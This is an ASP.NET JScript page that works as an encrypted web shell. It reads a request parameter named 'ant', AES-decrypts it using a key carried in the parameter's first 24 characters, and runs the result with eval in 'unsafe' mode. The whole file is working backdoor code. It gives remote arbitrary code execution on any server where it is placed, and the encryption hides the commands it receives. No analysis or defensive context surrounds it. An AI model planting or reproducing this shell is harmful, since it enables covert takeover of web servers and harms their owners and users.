<%@ Page Language="Jscript"%>
<% 
    var utf8 = new ActiveXObject("System.Text.UTF8Encoding");
    var b64Enc = new ActiveXObject("System.Security.Cryptography.ToBase64Transform");
    var b64Dec = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
    var aes = new ActiveXObject("System.Security.Cryptography.RijndaelManaged");
    aes.Padding = 3;
    aes.KeySize = 128;
    function B64Decode(b64Str){
        var bytes = utf8.GetBytes(b64Str);
        var decoded_bytes = b64Dec.TransformFinalBlock((bytes), 0, bytes.length);
        return decoded_bytes;
    }
    function Decrypt(cipherText, aesKey){
        var aesKeyBytes = utf8.GetBytes(aesKey);
        aes.IV = aesKeyBytes;
        var cipherBytes = B64Decode(cipherText);
        var aesDec = aes.CreateDecryptor((aesKeyBytes), (aes.IV));
        var plainBytes = aesDec.TransformFinalBlock(cipherBytes, 0, cipherBytes.length);
        var res = utf8.GetString(plainBytes);
        return res;
    }
    var data = Request.Item["ant"];
    var aesKey = data.substring(0,24);
    aesKey = utf8.GetString(B64Decode(aesKey));
    var encrypt_res = data.substring(24);
    var decrypted = Decrypt(encrypt_res, aesKey);
    eval(decrypted,"unsafe");

%>